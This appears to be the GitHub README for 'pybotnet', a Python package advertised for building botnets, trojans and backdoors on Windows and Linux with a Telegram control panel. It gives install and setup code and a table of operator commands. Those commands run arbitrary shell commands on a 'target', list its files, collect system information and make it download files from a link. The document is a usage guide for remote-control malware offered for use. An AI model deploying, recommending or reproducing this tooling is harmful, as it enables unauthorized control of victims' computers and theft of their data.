 
 <p align="center">
  <a href='https://github.com/onionj/pybotnet' target='_blank'><img src='https://i.postimg.cc/WFSTSLnW/trojan.png' border='0' alt='pybotnet icon'/></a>  <h1    align="center">pybotnet</h1>
  <p align="center"> A Python module for building <b>botnet</b> , <b>trojan</b>  or <b>backdoor</b> for windows and linux with Telegram control panel </p>


  <p align="center">
    <a href="https://github.com/onionj/pybotnet/blob/master/LICENSE">
      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg" />
    </a>
    <a href="https://www.python.org/">
    	<img src="https://img.shields.io/badge/built%20with-Python3-red.svg" />
    </a>
  </p>
</p>
 

> See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me 💕


### Features:
* get command from telegram and execute scripts 
* get command and send message by third party proxy
* get target info 
* sleep source by Optional message
* get ls (dirctory list)
* export file to targets system (target download a link :) )
* for more see commands table end of this page 



#### Requirements:

* Python 3.6 or higher
* Telegram account

### Usage:
```
pip install pybotnet
```

```python

from pybotnet import pybotnet
import time

# change TELEGRAM_TOKEN and  ADMIN_CHAT_ID to valid data:

# telegram api token (Get it from the telegram @botfather)
TELEGRAM_TOKEN = '1468299547:ABHs_________MzZcYxF_e00000000000'

# telegram account number ID (get it from @userinfobot)
ADMIN_CHAT_ID = '12345678910'



# * is_sheel:          if you compile code without shell: is_sheel=False
# * show_log:          just for debugging
# * send_system_data:  send system short info in every bot messages in telegram

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                        show_log=True, send_system_data=True, is_shell=True)

delay = 10

while True:
    print('*-*'*15)
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:

> Send this COMMANDs to your api bot in telegram, using the admin account.



COMMAND | Sample | DO THIS | Minimum version required | tested on |
--------|--------|---------|--------------------------|-----------|
`get_info` | `get_info` |return system info | 0.06 | windows, linux |
`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
`cmd <system command>` | `cmd mkdir new_folder` | run system command in shell or cmd (Be careful not to give endless command like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
`ls <route>` | `ls C:\ `,` ls /home` |Returns a list of folders and files in that path | 0.09 | windows, linux |
`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` |target donwload this file and save to script path route| 0.14 | windows linux|



>  for run command on one target:  `<Target_MAC_Address> <command>`   `66619484755211 get_info` 

